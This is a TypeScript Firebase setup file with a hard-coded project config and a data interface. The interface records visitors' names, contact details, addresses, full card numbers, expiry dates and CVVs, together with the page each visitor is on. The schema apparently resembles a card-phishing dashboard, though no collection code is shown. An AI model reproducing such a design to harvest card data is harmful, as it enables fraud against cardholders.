import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyBG9kn0oW9gTrwf2ic22q4u8rSPE-2fcxI",
  authDomain: "ofofoof-55d1c.firebaseapp.com",
  projectId: "ofofoof-55d1c",
  storageBucket: "ofofoof-55d1c.firebasestorage.app",
  messagingSenderId: "388295345422",
  appId: "1:388295345422:web:017cbb2ae4761bdbc8435f",
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
